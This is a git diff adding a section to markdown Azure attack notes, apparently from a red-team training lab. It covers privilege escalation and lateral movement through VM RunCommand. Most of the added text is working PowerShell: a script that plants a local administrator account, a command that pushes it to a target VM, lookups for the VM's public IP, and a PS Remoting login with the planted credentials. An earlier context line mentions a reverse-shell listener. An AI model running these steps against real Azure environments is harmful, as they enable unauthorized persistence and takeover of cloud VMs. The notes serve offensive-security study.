@@ -27,6 +27,7 @@ Privilege Escalation and Lateral Movement
   - [Add user to group in stolen session so we can enum resources](https://github.com/conma293/Azure/blob/main/killcycle.md#adding-to-group)
   - [enum Role Assignments (automation groups)](https://github.com/conma293/Azure/blob/main/killcycle.md#enumerate-resources-ie-role-assignments-for-automation-account)
   - [Create runbook](https://github.com/conma293/Azure/blob/main/killcycle.md#create-runbook)
+- [RunCommand]
 * * *
 
 TLDR:
@@ -753,7 +754,7 @@ Start-AzAutomationRunbook -RunbookName studentx -RunOn Workergroup1 -AutomationA
 
 On the listener, you should see a connect back and we can execute commands!
 
-* * * 
+## Run COmmand
 
 If you compromise a machine worth checking out azcontext, similar to sessions, if we steal an azcontext with ```select-azcontext``` we may be able to grab all the permissions (== Role Assignments) of that context/session. Good to check, similar to rubeus checking sessions 
 ```
@@ -761,5 +762,34 @@ get-azcontext
 select-azcontext -Name <copy pasted>
 ```
 
-* * * 
+#### Run a script 
+A powershell script to add users below:
+```
+$passwd = ConvertTo-SecureString "StudXPassword@123" -AsPlainText -Force
+New-LocalUser -Name studentX -Password $passwd
+Add-LocalGroupMember -Group Administrators -Member studentx
+```
+Now we can run the script via VMRumCommand:
+```
+Invoke-AzVMRunCommand -VMName bkpadconnect -ResourceGroupName Engineering -CommandId 'RunPowerShellScript' -ScriptPath 'C:\AzAD\Tools\adduser.ps1' -Verbose
+```
 
+
+#### Get Public IP
+```
+Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering
+Get-AzVM -Name bkpadconnect -ResourceGroupName Engineering | select -ExpandProperty NetworkProfile
+
+Get-AzNetworkInterface -Name bkpadconnect368
+
+Get-AzPublicIpAddress -Name bkpadconnectIP
+```
+
+#### Connect to VM
+Now we are a user on the VM and we know the publically addressable IP, we can connect directly to it using PS Remoting
+```
+$password = ConvertTo-SecureString 'StudxPassword@123' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('studentx', $Password) 
+$sess = New-PSSession -ComputerName 20.52.148.232 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer) 
+Enter-PSSession $sess
+```
